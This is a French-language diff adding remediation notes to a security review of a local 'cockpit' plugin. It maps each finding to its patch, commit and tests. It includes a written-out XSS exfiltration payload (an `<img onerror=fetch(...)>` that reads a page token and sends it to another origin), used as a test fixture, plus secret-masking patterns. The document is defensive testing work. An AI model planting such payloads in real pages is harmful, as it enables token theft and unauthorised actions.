@@ -52,3 +52,74 @@ Motif « aucune primitive partagée de confinement de chemin » (l.144, HIGH) : 
 
 ## Verdict : findings à traiter (gaps_found)
 Les sécurités sont des menaces : action ask-user (ADR-031). Ordre de correction proposé : B1 (retrait P15), B2 + M5, M1, M3, M4, M2 (décision produit : documenter ou détecter), puis mineurs.
+
+## Corrections et témoins (correction A, nœud fix-67-a, 2026-11-01)
+
+Correcteur : vf-coder, arbre `v2-cockpit`, de `2964658b` à `00e35ffc` (quatre commits `fix(cockpit): 67-FIX-A …`, puis un commit de documentation).
+Arbitrages : F1 = garder le mode « modifier le plan », DURCI, sans suppression de code amont (arbitrage Samuel, AskUserQuestion session principale, 2026-11-01 ;
+validation ADR-031 pour ce durcissement précis) ; lot A validé tel que décrit (même canal, même date). Aucune action sur la sévérité des findings : ce sont des
+menaces (ADR-031), la décision de clôture revient au manager et à l'auditeur.
+
+### Correspondance finding -> correctif -> témoin
+
+| finding | correctif (patch / fichier) | commit | témoin rouge d'abord (module `2964658b`) -> vert |
+|---|---|---|---|
+| B1 | P15 : `skillScript` ne lance que `plan.mjs`/`build.mjs` du moteur du module (`VF_COCKPIT_ENGINE_DIR` posé par le lanceur) ; `.cache/skill.json` et `.cache/history/` du lab ignorés puis supprimés au démarrage | c5868a5d | chaîne C0 (avant) : script du lab exécuté -> C1/C4 : jamais |
+| B2 | P16 : `h()` sur pied de carte, pastille, classe de statut ; `00-vibeflow.js` (Number(), h()) | c5868a5d | X2 : champs fuyants `["st","foot"]` -> `[]` ; X3 (mutant sans `h(size)`) détecte `foot` |
+| M5 | P17 : CSP (empreintes sha256 des 6+ scripts en ligne), `connect-src 'self'`, `img-src 'self' data:`, `frame-ancestors 'none'`, `form-action 'none'`, `base-uri 'none'`, `object-src 'none'`, nosniff, DENY sur TOUTES les réponses | c5868a5d | H1..H5 : `[false,false,false]` -> `[true,true,true]` ; H6 (mutant sans setHeader) rouge ; C1.4-C1.6 : 0 violation sous la CSP, cartes dessinées (Projet et Code) |
+| M1, M2 | `--setting-sources ""` + `--strict-mcp-config` dans `ARGS_CONFINEMENT` | 324986c2 | mesure réelle, voir « Mesure » ci-dessous ; S4 (argv) |
+| M3 | `driverLockScript` sans candidat sous le lab (realpath), `resolveScriptsDir` ne lit plus `.cache/`, `stop`/`--rebuild` par signal sur un PID vérifié | c9f73a8f | L1 `["absent","absent"]`, L2 0 exécution, L4, L5 (`oui` -> `non`), L6 (processus étranger vivant), L7 (`0:0` -> `5:1`), L8 (pid 1) |
+| M4 | `verifierSortie` avant toute écriture (aucun lien dans la sortie, realpath sous le lab) ; serveur statique : realpath sous le dossier | c9f73a8f, c5868a5d | Y1 (`0:0` -> `4:1`), Y2 (cibles intactes), Y3, Y4 (`200` -> `404`) ; Y5 témoin : un lien interne est servi |
+| M6 | corps non objet : 400 ; routeur, minuteries et `uncaughtException` rattrapés | c5868a5d, 00e35ffc | B1 : 15 combinaisons, `15` hors 400 -> `0` ; B2 : serveur vivant (`ERR ECONNREFUSED` -> `200`) |
+| M7 | `.cache/server.json` en 0600 ; hypothèse mono-utilisateur documentée (README du module) | c5868a5d | J1 `644` -> `600` |
+| M8 | `session` validé `^[0-9a-f-]{36}$`, passé en `--resume=<uuid>` | c5868a5d | S2 (`--dangerously-skip-permissions` absent de l'argv), S3 (`false` -> `true`) |
+| M9 | masque : `GITHUB_TOKEN=`, `AWS_SECRET_ACCESS_KEY=`, `API_KEY=`, `github_pat_`, `--password`, `X-Api-Key:` | 00e35ffc | M1 : `["ghx12345678","abcdef12345","zzz987","github_pat_ABC…"]` -> `[]` |
+| M10, S4 | chaque `<` du JSON devient `<` (embed, build du moteur, export) | c5868a5d | E1 : `[true,true,3]` -> `[false,true,2]` ; E2, E3 |
+| M11 | `touch` sans prototype ; échec franc sans `vf-cockpit-server.mjs` ; timeouts de tous les `execFileSync` ; regex de chemin ancrée ; `task`/`cwd`/rôle bornés et masqués, chemin des sessions en `~` | c9f73a8f, c5868a5d, 00e35ffc | K1 (`4` -> `0`), C1 (`vivant` -> `mort`), T1 (6 appels sans timeout -> `[]`), R1 (hors borne -> < 60 ms), B1 de la robustesse |
+
+Les cinq mineurs de la revue et S1-S3, P1 sont dans `67-FIX-A-SUMMARY.md` (même dossier) avec leurs témoins.
+
+### Témoin de bout en bout (F1) — `plugin/cockpit/scripts/tests/test-cockpit-chaine-xss.sh`
+
+Chaîne : lab piégé (un `PLAN.md` dont `wave:` porte `<img src=x onerror=fetch('/api/plan/undo',{method:'POST',headers:{…token…}});fetch('http://127.0.0.1:<P>/?t='+token)>`,
+un `.cache/skill.json` et un `.cache/history/` plantés désignant un faux moteur dont `plan.mjs`/`build.mjs` écrivent un marqueur) -> la charge devient du HTML dans la carte de la phase
+-> elle lit le jeton de la page -> `POST /api/plan/undo` -> exécution d'un script du lab ; en plus, envoi du jeton à une origine tierce.
+Navigateur : Chrome headless piloté par le protocole DevTools (WebSocket de node), page `project.html#v=n:ph-1`. Mutants : copies de la sortie, jamais le module
+(M-ESC retire `h()` du pied de carte, M-CSP neutralise les `setHeader` de CSP, M-GARDE rend à `skillScript` la lecture de `.cache/skill.json` et retire la purge au démarrage).
+
+| mesure | commande | module | charge dans le DOM | script du lab exécuté | jeton reçu par l'origine tierce | exit |
+|---|---|---|---|---|---|---|
+| AVANT | `CHAINE_SEUL=temoin bash test-cockpit-chaine-xss.sh` | `2964658b` (extrait par `git archive`, sans modification) | 1 | OUI | OUI | 0 (C0.1-C0.3 vertes : la chaîne aboutit) |
+| C0 témoin | `bash test-cockpit-chaine-xss.sh` | `00e35ffc`, les trois maillons retirés par mutants | 1 | OUI | OUI | 0 |
+| C1 code livré | idem | `00e35ffc` | 0 | non | non | 0, 0 violation CSP, 1 carte dessinée (Projet) et page Code idem |
+| C2 échappement seul (CSP et garde retirées) | idem | `00e35ffc` + M-CSP + M-GARDE | 0 | non | non | 0 |
+| C3 CSP seule (échappement et garde retirés) | idem | `00e35ffc` + M-ESC + M-GARDE | 1 | non | non | 0, violation relevée : « Executing inline event handler violates the following Content Security Policy directive 'script-src 'sha256-…' » |
+| C4 garde `.cache` seule (échappement et CSP retirés) | idem | `00e35ffc` + M-ESC + M-CSP | 1 | non | OUI (la CSP est retirée : l'exfiltration passe) | 0 |
+
+Sortie brute de la manche C3 (navigateur) : `[csp] mesure : charge-dans-le-DOM=1 script-du-lab-exécuté=non jeton-reçu-par-l'origine-tierce=non {"charges":1,"cartes":1,"violations":["Executing inline event handler violates …"]}` ;
+manche AVANT : `[temoin] mesure : charge-dans-le-DOM=1 script-du-lab-exécuté=oui jeton-reçu-par-l'origine-tierce=oui {"charges":1,"violations":[]}`.
+Sans navigateur (`CHAINE_SANS_NAVIGATEUR=1`, simulation fidèle : le rendu du pied de carte est rejoué par node sur la page servie, les en-têtes sont lus, la charge — lire le jeton, POST,
+exfiltration — est jouée par un client node selon la CSP lue : un gestionnaire en ligne ne s'exécute que si `script-src` manque ou admet `'unsafe-inline'`) : 15 assertions vertes, mêmes mesures.
+Le mode « modifier le plan » reste derrière le jeton ; avec la garde seule, un POST authentifié aboutit (200) mais n'exécute aucun script : C4.3.
+
+### Mesure `--setting-sources` (M1, M2) — détail dans `67-MESURE-claude-p.md` § Complément
+
+`claude -p` 2.1.316, haiku, bac à sable jetable par appel, réglages utilisateur réels actifs (9 événements de hooks, deux règles `allow` d'édition) :
+hooks sans le drapeau : 54 événements `hook_*` et le hook du lab exécuté ; avec `--setting-sources ""` : 0 et non exécuté (témoin négatif `--setting-sources user` : non exécuté ;
+`--restricted` : non exécuté, non retenu). Règle utilisateur `Edit(.planning/*)` : fichier modifié sans le drapeau, refusé avec (tentative et refus observés).
+`--strict-mcp-config` : aucun effet de bord. Le repli prévu (détecter une règle large et couper l'agent) n'est pas nécessaire.
+Limites : un modèle, une version de la CLI, réglages gérés (politique) toujours appliqués.
+
+### Rejeu final (sur `00e35ffc`, plugin/ identique au commit de documentation qui suit)
+
+`plugin/cockpit/scripts/tests/test-cockpit-*.sh` (14 suites) : 0 échec ; `plugin/_internal/tests/test-vibeflow-update-cockpit.sh` : 11 ok, 0 ko ; `bash plugin/cockpit/amont/synchro.sh verifier` : amont retrouvé à l'octet (48 fichiers).
+Gates : `check-version-sync`, `check-machine-paths`, `check-python-isolation`, `check-file-size --all` (0 avertissement), `check-ajout-retrait` verts ; `check-gate-touche` : aucun chemin de la surface surveillée touché.
+
+### Restes et décisions à transmettre
+
+- **M7 non fermé, assumé** : le jeton reste servi à tout processus local (limite amont) ; mitigation = 0600 sur `server.json` et hypothèse mono-utilisateur écrite dans le README.
+- Hors périmètre de ce mandat (scripts/** et gates) : `scripts/check-python-isolation.sh` exclut par dossier `*/assets/vendor/*` (mineur 8 de la revue) — non touché.
+- Non traité, mineurs de lecture : `diff` du direct ne voit que id/st/foot (un renommage n'émet rien tant qu'aucun ajout/retrait ne survient) ; doublons `ID_RE`/`ls`/`read`/`isFile` ; `inventaireDeSortie` absent de l'en-tête `Exports` ; `activeKeys` jamais lu (mineur 10).
+- `tail()` en `try/finally` : corrigé, sans test dédié (provoquer un `readSync` qui lève exige un descripteur piégé ; la lecture du code est le témoin).
+- Windows : `ps` indisponible, le PID de `stop` n'y est vérifié que par bornes (entier > 1, vivant, ni le nôtre) ; non mesuré (D-16).
+- `dag.sh` `save()` / T-67-01 : non touché (fermé à la lecture, voir plus haut).
